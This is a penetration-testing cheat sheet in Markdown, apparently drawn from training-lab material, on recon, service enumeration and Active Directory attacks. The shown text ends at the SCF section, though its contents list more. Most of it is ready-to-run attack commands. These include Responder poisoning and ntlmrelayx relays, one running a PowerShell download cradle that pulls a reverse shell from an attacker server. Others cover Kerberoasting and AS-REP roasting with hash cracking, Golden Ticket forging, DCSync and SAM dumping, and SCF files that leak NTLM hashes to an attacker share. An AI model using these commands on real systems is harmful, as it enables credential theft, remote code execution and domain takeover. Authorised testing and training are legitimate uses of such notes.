- [Passive Reconnaissance](#passive-reconnaissance)
	- [What to Look For](#what-to-look-for)
	- [Resources](#resources)
	- [Google Dorks](#google-dorks)
	- [Enumerate Subdomains](#enumerate-subdomains)
	- [Username Harvesting](#username-harvesting)
- [Active Reconnaissance](#active-reconnaissance)
	- [First Look at a Host](#first-look-at-a-host)
	- [DNS Records](#dns-records)
	- [Identify OS Codename from Service Version](#identify-os-codename-from-service-version)
	- [Reconnaissance Frameworks](#reconnaissance-frameworks)
- [Service Enumeration](#service-enumeration)
	- [FTP (port 21)](#ftp-port-21)
	- [SSH (port 22)](#ssh-port-22)
	- [DNS (port 53)](#dns-port-53)
	- [SMB (port 445)](#smb-port-445)
	- [RPC (port 445)](#rpc-port-445)
	- [LDAP (port 389)](#ldap-port-389)
	- [Kerberos (port 88)](#kerberos-port-88)
	- [NFS (ports 111 and 2049)](#nfs-ports-111-and-2049)
	- [SMTP (ports 25, 587, 465)](#smtp-ports-25-587-465)
	- [SNMP (UDP ports 161 and 162)](#snmp-udp-ports-161-and-162)
	- [MySQL (port 3306)](#mysql-port-3306)
	- [MSSQL (port 1433)](#mssql-port-1433)
	- [Oracle TNS (port 1521)](#oracle-tns-port-1521)
	- [IPMI (UDP port 623)](#ipmi-udp-port-623)
	- [RDP (port 3389)](#rdp-port-3389)
	- [WinRM (ports 5985/5986)](#winrm-ports-59855986)
- [LLMNR / NBT-NS Poisoning](#llmnr--nbt-ns-poisoning)
- [SAMBA Relay](#samba-relay)
- [NTLM Relay](#ntlm-relay)
	- [IPv4](#ipv4)
		- [Execute commands](#execute-commands)
	- [IPv6](#ipv6)
- [AS-REP Roast/Roasting](#as-rep-roastroasting)
- [Kerberoasting](#kerberoasting)
	- [From Linux — GetUserSPNs.py](#from-linux--getuserspnspy)
	- [Listing SPN Accounts](#listing-spn-accounts)
	- [Requesting all TGS Tickets](#requesting-all-tgs-tickets)
	- [Requesting a single ticket](#requesting-a-single-ticket)
	- [Saving the TGS Ticket to an Output File](#saving-the-tgs-ticket-to-an-output-file)
	- [Cracking the ticket offline with hashcat](#cracking-the-ticket-offline-with-hashcat)
	- [Testing Authentication against a Domain Controller](#testing-authentication-against-a-domain-controller)
	- [From Windows — setspn.exe](#from-windows--setspnexe)
	- [Extracting Tickets from Memory with Mimikatz](#extracting-tickets-from-memory-with-mimikatz)
	- [kirbi2john.py](#kirbi2johnpy)
	- [Modifying crack_file for Hashcat](#modifying-crack_file-for-hashcat)
	- [Cracking the hash with hashcat](#cracking-the-hash-with-hashcat)
	- [Automated / Tool Based Routes](#automated--tool-based-routes)
		- [Rubeus](#rubeus)
		- [Using /stats Flag](#using-stats-flag)
		- [/nowrap flag](#nowrap-flag)
- [Golden Ticket Attack](#golden-ticket-attack)
- [DCSync](#dcsync)
	- [Mimikatz](#mimikatz)
	- [impacket-secretsdump](#impacket-secretsdump)
- [SCF Files (SMB Hash Capture)](#scf-files-smb-hash-capture)
- [Abusing GPP Passwords](#abusing-gpp-passwords)
- [Password Spraying](#password-spraying)
	- [From a Linux Host](#from-a-linux-host)
		- [Password spraying for LDAP service](#password-spraying-for-ldap-service)
	- [Internal Password Spraying - from Windows](#internal-password-spraying---from-windows)
	- [External Password Spraying](#external-password-spraying)
- [Windows Privilege Escalation](#windows-privilege-escalation)
	- [Obtain basic information](#obtain-basic-information)
	- [Scheduled Tasks](#scheduled-tasks)
	- [Search exposed credentials](#search-exposed-credentials)
	- [Password reuse](#password-reuse)
	- [Abusing privileges or popular groups](#abusing-privileges-or-popular-groups)
		- [SeImpersonatePrivilege](#seimpersonateprivilege)
		- [SeLoadDriverPrivilege](#seloaddriverprivilege)
		- [Server Operator groups](#server-operator-groups)
	- [Kiosk Mode](#kiosk-mode)
	- [Docker Escape](#docker-escape)
	- [Vulnerable software](#vulnerable-software)
	- [Kernel exploits](#kernel-exploits)
	- [Abusing `SeImpersonate` privileges](#abusing-seimpersonate-privileges)
	- [Enumeration scripts](#enumeration-scripts)
	- [RBCD Attack](#rbcd-attack)
		- [Create a computer object](#create-a-computer-object)
		- [Configurating Resource-Based Constrained Delegation](#configurating-resource-based-constrained-delegation)
		- [Obtaining TGT ticket with impacket-getST.py](#obtaining-tgt-ticket-with-impacket-getstpy)
		- [Connect to the host](#connect-to-the-host)
	- [Check if some user is kerberoastable and as-rep roastable](#check-if-some-user-is-kerberoastable-and-as-rep-roastable)
	- [Abuse Account Operator group + WriteDACL in another group](#abuse-account-operator-group--writedacl-in-another-group)
		- [Do the DcSync](#do-the-dcsync)
- [Change user with runascs.exe](#change-user-with-runascsexe)
- [Search internal open ports](#search-internal-open-ports)
- [Linux Privilege Escalation](#linux-privilege-escalation)
	- [Checklist](#checklist)
	- [Add SUID privilege to the bash](#add-suid-privilege-to-the-bash)
	- [Add Public Key (persistence)](#add-public-key-persistence)
- [Pivoting - Strategy](#pivoting---strategy)
	- [When to Use Each Tool](#when-to-use-each-tool)
	- [General Pivoting Flow](#general-pivoting-flow)
- [Active Directory Enumeration](#active-directory-enumeration)
	- [Initial Enumeration Flow](#initial-enumeration-flow)
	- [With BloodHound](#with-bloodhound)
	- [Identify Vulnerabilities from SYSTEM](#identify-vulnerabilities-from-system)
- [Enumerating Password Policy](#enumerating-password-policy)
	- [Enumerating password policy from Linux](#enumerating-password-policy-from-linux)
	- [Enum null session from Windows](#enum-null-session-from-windows)
	- [Enumerating password policy from Linux - LDAP Anonymous Bind](#enumerating-password-policy-from-linux---ldap-anonymous-bind)
		- [ldapsearch](#ldapsearch)
	- [Enumerate the password policy from windows](#enumerate-the-password-policy-from-windows)
	- [PowerView](#powerview)
- [Enumerating Domain Users](#enumerating-domain-users)
	- [SMB Null session to pull user list](#smb-null-session-to-pull-user-list)
	- [Gathering users with LDAP Anonymous](#gathering-users-with-ldap-anonymous)
	- [Search domain admins](#search-domain-admins)
	- [Search privileged users](#search-privileged-users)
	- [Enumerate users with kerbrute](#enumerate-users-with-kerbrute)
	- [With authenticated credentials](#with-authenticated-credentials)
- [Web Enumeration](#web-enumeration)
	- [First Look](#first-look)
	- [Important Files/Paths to Check](#important-filespaths-to-check)
	- [Active Enumeration](#active-enumeration)
	- [Web Crawling](#web-crawling)
- [Squid Proxy](#squid-proxy)
- [Virtual Hosting](#virtual-hosting)
- [Common Scenarios](#common-scenarios)
	- [Scenario 1: No Credentials — Discover and Move](#scenario-1-no-credentials--discover-and-move)
	- [Scenario 2: Non-Standard Username Format](#scenario-2-non-standard-username-format)
- [Pentest Guidelines](#pentest-guidelines)
	- [Suggested Order of Operations](#suggested-order-of-operations)
	- [Key Notes](#key-notes)
	- [Useful Resources](#useful-resources)
	- [Default Passwords to Try](#default-passwords-to-try)
	- [Protocol Command Tables](#protocol-command-tables)
- [NFS — Privilege Escalation](#nfs--privilege-escalation)
- [SMTP — Enumeration Methodology](#smtp--enumeration-methodology)
- [IPMI — Attack Procedure](#ipmi--attack-procedure)
- [SSH with Kerberos](#ssh-with-kerberos)
	- [Login in ssh with kerberos](#login-in-ssh-with-kerberos)
- [Security Controls Enumeration](#security-controls-enumeration)
	- [Windows Defender](#windows-defender)
	- [AppLocker](#applocker)
	- [PowerShell Constrained Language Mode](#powershell-constrained-language-mode)
	- [LAPS](#laps)
- [Credentialed Enumeration](#credentialed-enumeration)
	- [From Winux](#from-winux)
		- [Crackmapexec](#crackmapexec)
		- [SMBMap](#smbmap)
- [Shells and Payloads — Strategy](#shells-and-payloads--strategy)
- [TTY Upgrade — Procedure](#tty-upgrade--procedure)
- [Metasploit — Advanced Workflow](#metasploit--advanced-workflow)
- [Advanced Pivoting — Strategy](#advanced-pivoting--strategy)
- [Password Spraying Scenarios](#password-spraying-scenarios)
- [Local Administrator Password Reuse](#local-administrator-password-reuse)
- [Living Off the Land](#living-off-the-land)
	- [Windows Enumeration Commands](#windows-enumeration-commands)
	- [PowerShell Enumeration & Execution Commands](#powershell-enumeration--execution-commands)
		- [Downgrade PowerShell](#downgrade-powershell)
	- [Checking defenses](#checking-defenses)
		- [Firewall checks](#firewall-checks)
		- [Windows Defender Check](#windows-defender-check)
	- [Check if you are alone](#check-if-you-are-alone)
	- [Network Settings](#network-settings)
	- [Network & Firewall Enumeration Commands](#network--firewall-enumeration-commands)
	- [Windows Management Instrumentation (WMI)](#windows-management-instrumentation-wmi)
	- [WMIC Enumeration Commands](#wmic-enumeration-commands)
	- [Net Commands](#net-commands)
	- [Net Commands Enumeration & Management](#net-commands-enumeration--management)
		- [Net commands tricks to avoid network defenders](#net-commands-tricks-to-avoid-network-defenders)
	- [Dsquery](#dsquery)
		- [User Search](#user-search)
		- [Computer Search](#computer-search)
		- [Wildcard Search](#wildcard-search)
		- [Users With Specific Attributes Set (PASSWD_NOTREQD)](#users-with-specific-attributes-set-passwd_notreqd)
		- [Searching for domain controller](#searching-for-domain-controller)
	- [LDAP Filtering Explained](#ldap-filtering-explained)
		- [OID match string](#oid-match-string)
		- [Logical Operators](#logical-operators)
- [CVE](#cve)
	- [CVE-2012-1823 | PHP-CGI](#cve-2012-1823--php-cgi)
	- [CVE-2024-4577 | PHP-CGI](#cve-2024-4577--php-cgi)



---

## Passive Reconnaissance

### What to Look For

| Category | What to Obtain |
|----------|----------------|
| IP Space | ASN, public infrastructure netblocks |
| Domain Information | Subdomains, mail servers, DNS, VPN, defense type (SIEM, AV, IPS/IDS) |
| Schema Format | Email format, AD usernames, password policies |
| Data Disclosures | Public files (.pdf, .ppt, .docx) with metadata, GitHub, S3 buckets |
| Breach Data | Usernames/passwords from breaches (HaveIBeenPwned, Dehashed) |

### Resources

- IP/ASN: [BGP Toolkit](https://bgp.he.net/), [ARIN](https://www.arin.net/), [RIPE](https://www.ripe.net/)
- Domain: [Domaintools](https://www.domaintools.com/), [PTRArchive](http://ptrarchive.com/), [ICANN](https://lookup.icann.org/lookup), [viewdns.info](https://viewdns.info/)
- Breaches: [HaveIBeenPwned](https://haveibeenpwned.com/), [Dehashed](https://www.dehashed.com/)
- Subdomains: [crt.sh](https://crt.sh/), [shodan.io](https://shodan.io)
- Cloud: [grayhatwarfare](https://buckets.grayhatwarfare.com/)
- Code: [Trufflehog](https://github.com/trufflesecurity/truffleHog)

### Google Dorks

```
filetype:pdf inurl:inlanefreight.com
intext:"@inlanefreight.com" inurl:inlanefreight
site:example.com inurl:login
site:example.com (inurl:login OR inurl:admin)
site:example.com filetype:pdf
site:example.com inurl:config.php
site:example.com filetype:sql
intext:domain.com inurl:amazonaws.com
intext:domain.com inurl:blob.core.windows.net
```

### Enumerate Subdomains

> Always enumerate at multiple levels: if you find `test.inlanefreight.htb`, `dev.test.inlanefreight.htb` may also exist.

```bash
# crt.sh (certificate transparency)
curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u

# Filter company IPs (not third-party)
for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done

# Shodan with found IPs
for i in $(cat ip-addresses.txt);do shodan host $i;done
```

### Username Harvesting

- LinkedIn → [linkedin2username](https://github.com/initstring/linkedin2username)
- Statistical lists: [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) (`jsmith.txt`, `jsmith2.txt`)
- Breach credentials: [Dehashed](http://dehashed.com/)

---

## Active Reconnaissance

### First Look at a Host

1. Ping to confirm it's alive: `ping -c 1 <IP>`
2. Fast TCP SYN scan: `sudo nmap -p- --open -sS -T4 --min-rate 4500 -vvv -n -Pn -oG allPorts`
3. Scripts + versions on open ports: `sudo nmap -p<ports> -sCV -oN targeted`
4. UDP if nothing interesting on TCP: `sudo nmap -sU -T5 -Pn -n -F <IP>`

### DNS Records

```bash
dig any inlanefreight.com    # all records
nslookup ns1.inlanefreight.com
```

### Identify OS Codename from Service Version

If SSH returns `1:7.3p1-1ubuntu0.1`, search Google for `"1:7.3p1-1ubuntu0.1 codename"` to identify the exact Ubuntu version.

### Reconnaissance Frameworks

- [FinalRecon](https://github.com/thewhiteh4t/FinalRecon): `./finalrecon.py --headers --whois --url http://inlanefreight.com`
- [Recon-ng](https://github.com/lanmaster53/recon-ng)
- [theHarvester](https://github.com/laramies/theHarvester)
- [SpiderFoot](https://github.com/smicallef/spiderfoot)
- [OSINT Framework](https://osintframework.com/)

---

## Service Enumeration

### FTP (port 21)

1. Check if it allows anonymous login (`nmap -sCV` detects it automatically)
2. If anonymous is allowed, list and download everything: `wget -m --no-passive ftp://anonymous:anonymous@<IP>`
3. Check TLS: `openssl s_client -connect <IP>:21 -starttls ftp` — certificate may reveal hostname and email

Anonymous login:
```bash
ftp 10.129.42.253
# name anonymous
# password anonymous
```

Using passive connection:
```bash
ftp -p 10.129.42.253
```
With **-p** parameter you are using the **passive connection**. With passive connection is straightforward avoid firewall in the client (our attacker machine)

To connect a host with another port:
```bash
ftp 192.168.1.1 2121
```

FTP commands:
- `cd` -> Move through directories.
- `ls` -> List content
- `ls -la` -> To see hidden files.
- `ls -R` -> Recursive listing
- `get file.txt` -> Obtain a file
- `prompt` -> Allow to retrieve multiple files
- `mget *` -> Obtain multiple files
- `exit/bye` -> Disconnect from FTP server.
- `status` -> Show an overview of the server's settings
- `put testupload.txt` -> Upload a file

### SSH (port 22)

1. Check the banner (protocol and version)
2. Check for known CVEs:
   - OpenSSH 7.2p1 → command injection
   - CVE-2020-14145 (5.7-8.4) → Man-in-the-Middle on initial connection
3. Brute force if appropriate: `hydra -l user -P rockyou.txt ssh://<IP>`

### DNS (port 53)

1. Query records: `dig any domain.htb @<IP>`
2. Attempt zone transfer: `dig axfr domain.htb @<IP>` — if it works, reveals full infrastructure
3. Subdomain brute force: dnsenum, subfinder, amass

### SMB (port 445)

1. `nmap --script smb-os-discovery.nse` — OS version
2. `smbclient -L <IP> -N` — null session (list shares without credentials)
3. `smbmap -H <IP>` — view permissions
4. `crackmapexec smb <IP>` — basic info
5. With credentials: `crackmapexec smb <IP> -u user -p pass --shares`
6. Check EternalBlue: `nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17-010`

### RPC (port 445)

1. Attempt anonymous connection: `rpcclient -U "" <IP> -N`
2. Enumerate users: `enumdomusers`
3. Enumerate groups: `enumdomgroups`
4. Get user descriptions (may contain passwords): `querydispinfo`
5. Alternatively: `enum4linux-ng <IP>`

### LDAP (port 389)

1. Get naming contexts: `ldapsearch -x -H ldap://<IP> -s base namingcontexts`
2. If anonymous bind is enabled: `ldapsearch -x -H ldap://<IP> -b 'DC=...,DC=LOCAL'`
3. With valid credentials: `ldapdomaindump`

### Kerberos (port 88)

1. If port 88 is open, enumerate valid users with Kerbrute (doesn't generate failed authentication logs)
2. Check AS-REP Roasting: `impacket-GetNPUsers domain.htb/ -no-pass -usersfile users.txt`
3. With credentials, check Kerberoasting: `impacket-GetUserSPNs domain.htb/user:pass`

### NFS (ports 111 and 2049)

1. View mounts: `showmount -e <IP>`
2. Mount: `sudo mount -t nfs <IP>:/ ./target-NFS/ -o nolock`
3. View real permissions (UID): `ls -n mnt/nfs/`
4. If `root_squash` is not active: possible escalation via SUID

### SMTP (ports 25, 587, 465)

1. Banner grabbing: `nc -nv <IP> 25`
2. Enumerate users with VRFY: `smtp-user-enum -M VRFY -U users.txt -t <IP>`
3. Open relay: `nmap -p25 --script smtp-open-relay -v`
4. Interact manually: `telnet <IP> 25` → `EHLO`, `VRFY root`, `MAIL FROM:`...

### SNMP (UDP ports 161 and 162)

1. Brute force community strings: `onesixtyone -c dict.txt <IP>`
2. With known community string: `snmpwalk -v2c -c public <IP>`
3. Specific OID → convert `iso.X.Y.Z` to `1.X.Y.Z` and use `snmpget`

### MySQL (port 3306)

1. Attempt connection without password: `mysql -u root -h <IP>`
2. Nmap scripts: `nmap -sV -sC -p3306 --script mysql*`
3. View system connections (lateral movement): `use sys; select host, unique_users from host_summary;`

### MSSQL (port 1433)

1. Nmap scripts: `nmap --script ms-sql-* ...`
2. Metasploit module: `mssql_ping`
3. Connect: `python3 mssqlclient.py Administrator@<IP> -windows-auth`

### Oracle TNS (port 1521)

1. SID brute force: `nmap -p1521 --script oracle-sid-brute` or `odat.py all -s <IP>`
2. Connect with found SID: `sqlplus user/pass@<IP>/XE`
3. If sysdba → extract password hashes: `select name, password from sys.user$;`
4. Upload web shell: `odat.py utlfile ... --putFile`

### IPMI (UDP port 623)

1. `nmap -sU --script ipmi-version -p 623`
2. Dump password hashes: `use auxiliary/scanner/ipmi/ipmi_dumphashes`
3. Crack with hashcat mode 7300
4. Default passwords: Dell iDRAC (`root:calvin`), HP iLO (`Administrator:random`), Supermicro (`ADMIN:ADMIN`)

### RDP (port 3389)

1. Security audit (without generating alerts): `rdp-sec-check.pl <IP>`
2. Connect: `xfreerdp /u:user /p:pass /v:<IP>`
3. If there are special characters: escape them with `\`

### WinRM (ports 5985/5986)

1. Check if user is member of Remote Management Users: `netexec winrm <IP> -u user -p pass`
2. If "pwned": `evil-winrm -u user -p pass`

---

## LLMNR / NBT-NS Poisoning

**How it works:**
1. A host tries to connect to `\\printer01.inlanefreight.local` (mistyped)
2. DNS responds: unknown
3. The host broadcasts a question on the local network
4. Responder (attacker) responds: "that's me"
5. The host sends NTLM credentials to the attacker

**Usage:**
```bash
sudo responder -I ens224
```

Captured hashes are NTLMv2 → crackable with hashcat mode 5600, but **cannot be used for Pass-the-Hash**.

**Remediation:** Disable LLMNR and NBT-NS in Active Directory.

---

## SAMBA Relay

> [!WARNING]
> **Prerequisites**
> - The signature must to be enable but no required or disabled
> - Must be on the local network
> - User credentials must have remote login access.

You as an attacker start a SMB Server that responds to all SMB requests that doesn't exist obtained the hash NTLM of the user.

This is better to do on-site in place of use a vpn.

Configure file: Responder.conf

By default the idea is wait that some user try to access to a share resource of SMB and made a mistake writing or the SMB server is off.

With this, you obtain the hash NTLM of the user, you can't do PTH(Pass The Hash) but you can try to crack it.

If some administrator account is running some service in the network with SMB you can get their credentials. This technique is slow but very easy to do.

```bash
python3 Responder.py -I eth0 -rdw
```

When you obtain the hash you can try to crack it:
```bash
john --wordlist=rockyou.txt hashes
```

---

## NTLM Relay

> [!WARNING]
> **Prerequisites**
> - The signature must to be enable but no required or disabled
> - Must be on the local network
> - User credentials must have remote login access.

### IPv4

Try to obtain some hash ntlm and check if is an administrator credential of the computers that we indicate in a file.

In the configuration file of the responder(/usr/share/responder/Responder.conf) you can change the value of SMB and HTTP to **off**.

You can create a file with the IP of the target.

The idea is to obtain the authentication obtained with responder and redirect the flow of the auth to the victim machine(indicated in the file) to test if the ntlm is valid and obtain automatically the SAM of the victim machine.
```bash
python3 Responder.py -I eth0 -rdw
```

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

targets.txt -> Have the computers victim that try the credentials to check if are administration users of the computer and obtain automatically the SAM.

#### Execute commands

You can execute commands and example is obtained a reverse shell.

You have a powershell reverse shell ready and running a python server.
```
python3 -m http.server 8000
```

You have to listening the reverse shell.
```bash
rlwrap nc -nlvp 4646
```

Then with ntlmrelay you can execute command to obtain the reverse shell:
```bash
ntlmrelayx.py -tf targets.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/revshell.ps1:8000')"
```

Start the responder to poisoning the service.
```bash
python3 Responder.py -I eth0 -rdw
```

### IPv6

Sometimes with IPv4 is all well parched and you can't do nothing but sometimes forget to protect IPv6.

You can use mitm6 tool to poisoning the domain and with ntlmrelay we can create a tunnel and use proxychains to connect.

By default, windows machine request IPv6 traffic

With this tool if you check the poisoned computers the **gateway** have your IPv6(IPv6 of you attacking machine) and the **main DNS** with your IPv6.

```bash
mitm6 -d domain.local
```

Create an interactive session of relays:
```bash
ntlmrelayx.py -6 -wh 10.10.10.10(attacker machine) -t smb://10.10.10.15(victim machine) -socks -debug -smb2support
```

Sometimes when obtain a administrator credential the ntlmrelay doesn't indicate that is admin(the solution is reboot the victim machine). It's very common to do this type of attack several times.

Commands:
- socks: Show proxies when some user access to some failed resource. Show the AdminStatus(true,false)

---

If you finally obtained **admin credentials** you can open /etc/proxychains.conf and check or add the proxy configuration: 127.0.0.1 1080 and socks4(no tested for socks5)

You can try to connected to the machine and you don't need to know the password thanks to the relay.
```bash
crackmapexec smb 10.10.10.10 -u 'usuario' -p 'randomstring' -d 'dominio.local'
```

Dump the hash
```bash
crackmapexec smb 10.10.10.10 -u 'usuario' -p 'randomstring' -d 'dominio.local' --sam
```
You almost can dump the LSA(Local Security Authority)...

---

## AS-REP Roast/Roasting

> [!NOTE]
> You only need a list of users

> [!WARNING]
> Your clock must be synchronized with the clock of the DC.
>
> To solve this you can use **rpate** or **ntpdate 10.10.10.10** to sync your computer with the DC time. With **date -s** you can put a new date.

If you have a wordlists of users but **you don't have any password** you can try to obtain a TGT(ticket granting ticket) of this users with **impacket-GetNPUsers** to obtain hash(password) that after you can try to crack it:
```bash
impacket-GetNPUsers domain.htb/ -no-pass -usersfile users.txt -dc-ip <IP> 
```

This not work always, have to set UF_DONT_REQUIRE_PREAUTH.

If you obtain the hash you can crack with john, hashcat...

You can do either if you have valid credentials, just in case you lose some user.
```bash
impacket-GetNPUsers domain.htb/user:password -no-pass -usersfile users.txt -dc-ip <IP> 
```

asreproasting attack:
```
Rubeus.exe asreproast /user:user /domain:domain.local /dc:<hostname>
```

---

## Kerberoasting

**Prerequisite:** Valid credentials of any domain user.

**Concept:** Accounts with SPN (Service Principal Name) have a TGS ticket whose hash contains the service password. It can be requested and cracked offline.

> [!WARNING]
> **Your clock must be synchronized with the clock of the DC**
>
> To solve this you can use **rpdate** or **ntdate 10.10.10.10** to sync your computer with the DC time. With **date -s** you can put a new date.

This techniques abuse of Kerberos and TGS(Ticket Granting Service) . The ticket have a hash with the password of the user.

This is possible if the account user is SPN(Service Principal Name).
SPN is a unique identifier that link the account to some services running in the network(ex: IIS, SQL Server, exchange, SharePoint, LDAP...)

The service SPN have a kerberos hash with the password

Is a lateral movement/privilege escalation technique in Active Directory. This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account.

Any domain user can request a Kerberos ticket for any service account in the same domain.

All you need is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using runas /netonly.

TGS tickets take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.

### From Linux — GetUserSPNs.py

Install impacket: https://github.com/SecureAuthCorp/impacket

```bash
sudo python3 -m pip install .
```

### Listing SPN Accounts

We can start just gathering a listing of SPNs in the domain. We can authenticate to the domain controller with a cleartext password, NT password hash, or even a Kerberos ticket.

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

We see that several accounts are members of the Domain Admins group. If we can retrieve and crack one of these tickets, it could lead to domain compromise. It is always worth investigating the group membership of all accounts because we may find an account with an easy-to-crack ticket.

### Requesting all TGS Tickets

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

Now with the ticket we can use Hashcat or to a GPU cracking rig

### Requesting a single ticket

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

### Saving the TGS Ticket to an Output File

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

### Cracking the ticket offline with hashcat

```bash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

### Testing Authentication against a Domain Controller

```bash
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

You can check if is vulnerable with **impacket-GetUserSPNs**

```bash
impacket-GetUserSPNs domain.htb/user:password
```

If the output give information of users mean that are vulnerables.

Or you can use `Get-ADUser` from ActiveDirectory module of PowerShell.

You can obtain the hash:

```bash
impacket-GetUserSPNs domain.htb/user:password -request
```

To crack the hash you have to save all in a file(ex: hash.txt) and you can try to use john:
```bash
john -w:rockyou.txt hash
```

### From Windows — setspn.exe

Enumerating SPNs:
```powershell
setspn.exe -Q */*
```

Target a single user:
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

- `Add-Type`: Is used to add a .NET framework class to our powershell session.
- `-AssemblyName`: Allow us to indicate an assembly that contains types that we are intested in using
- `System.IdentityModel`: Is a namespace that contains different classes for building security token services.
- `New-Object`: Create a instance of .NET framework object.
- `System.IdentityModel.Tokens and KerberosRequestorSecurityToken`: Allow us to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current login.

Retrieving all tickets using setspn.exe:
```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

### Extracting Tickets from Memory with Mimikatz

Now that the tickets are loaded, we can use `Mimikatz` to extract the ticket(s) from `memory`.

- `base64 /out:true`: If we don't identify this command, mimikatz will extract the tickets and write them to `.kirbi` files.
- `kerberos::list /export`: Export all the tickets

Preparing the base64 blob for cracking:
```bash
echo "<base64 blob>" |  tr -d \\n
```

Convert to .kirbi file:
```bash
cat encoded_file | base64 -d > sqldev.kirbi
```

### kirbi2john.py

We can try to crack it with:

```bash
python2.7 kirbi2john.py sqldev.kirbi
```

This will create a file called crack_file. We need to modify to be able to use Hashcat against the hast

### Modifying crack_file for Hashcat

```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

You can check if the hash have the correct format to use hashcat `cat sqldev_tgs_hashcat`.

### Cracking the hash with hashcat

```bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

### Automated / Tool Based Routes

Now, we are going to see two much quicker ways to perform Kerberoasting attack from Windows Host.

Enumerate the SPN accounts with PowerView:
```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

PowerView to target a specific user:
```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

Export all tickets to a CSV file:
```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

#### Rubeus

We can also use [Rubeus](https://github.com/GhostPack/Rubeus) to perform Kerberoasting

```powershell
.\Rubeus.exe
```

#### Using /stats Flag

```powershell
.\Rubeus.exe kerberoast /stats
```

If you see a password that has not changed from many years ago, it is possible that it will be a weak one.

#### /nowrap flag

We want to obtain the tickets with the admincount attribute set to 1
```
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

We use `/nowrap` flag to copied the hash more easily for offline cracking.

Kerberoasting attack:
```
Rubeus.exe kerberoast /creduser:domain.local\user /credpassword:password
```

---

## Golden Ticket Attack

**Prerequisites:**
- NTLM hash of the `krbtgt` user
- Domain SID
- Domain name
- Target user RID

**Concept:** With the `krbtgt` hash, a fake TGT can be created that grants access to all domain resources, even if the user changes their password.

**Flow:**

1. Get krbtgt data with mimikatz:
```
lsadump::lsa /inject /name:krbtgt
```

2. Create the golden ticket:
```
kerberos::golden /domain:domain.local /sid:<sid_krbtgt> /rc4:<hash_ntlm> /user:Administrator /ticket:golden.kirbi
```

3. Pass The Ticket (apply the ticket):
```
kerberos::ptt golden.kirbi
dir \\<hostname_DC>\c$
```

**Alternative with impacket:**
```bash
impacket-ticketer -nthash <hash_krbtgt> -domain-sid S-1-5... -domain domain.local Administrator
export KRB5CCNAME="/path/Administrator.ccache"
psexec.py -n -k domain.local/Administrator@<DC-hostname> cmd.exe
```

**Transfer ticket between machines:**
```bash
# Attacker: SMB server
impacket-smbserver smbFolder $(pwd) -smb2support

# Windows: copy ticket
copy golden.kirbi \\<attacker_ip>\smbFolder\golden.kirbi
```

---

## DCSync

The user need to have the permission, `DS-Replication-Get-Changes` y `Get-Changes-All`

### Mimikatz

You can upload a mimikatz binary to the DC or a windows machine.

Obtain NTLM hashes of users.

Only for a user:

```
lsadump::dcsync /domain:domain.local /user:krbtgt
```

Normally for krbtgt account because is the account that sign all the hashes. This means that if you have the hash of this account, you can create all the TGTs that you want. This allow you to:
- persistence
- Escalate/impersonate: Create a ticket indicating any user, including one that doesn't exist, that belongs to the groups that you want.

For administrator user:
```
lsadump::dcsync /domain:domain.local /user:Administrator
```

For all users:

```
lsadump::dcsync /domain:domain.local /all /csv
```

### impacket-secretsdump

With credentials in clear text:
```
secretsdump.py domain.local/admin:'Password123'@10.10.10.5 -just-dc
```

- `-just-dc`: only do DCSync

Only hashes NTLM
```
secretsdump.py domain.local/admin:'Password123'@10.10.10.5 -just-dc-ntlm
```

---

## SCF Files (SMB Hash Capture)

If you have some user that can write in SMB you can create a scf file that allow you to obtain the hash NTLM.

When the user open the resource it try to load this type of files, then, with UNC try to obtain the icon in a malicious server.

You can use `scf`, `.lnk`, `url` extension.

Content of **file.scf**. The idea of this type of files is poisoning the icon of the file.
```
[SHELL]
Command=2
IconFile=\\<attacker_ip>\smbFolder\malicious.url
[Taskbar]
Command=ToggleDesktop
```

Also you can test with a `desktop.ini`.
```
[.ShellClassInfo] IconResource=\\192.168.1.100\share\folder,0
```

With smbclient you can upload the file with `put` command

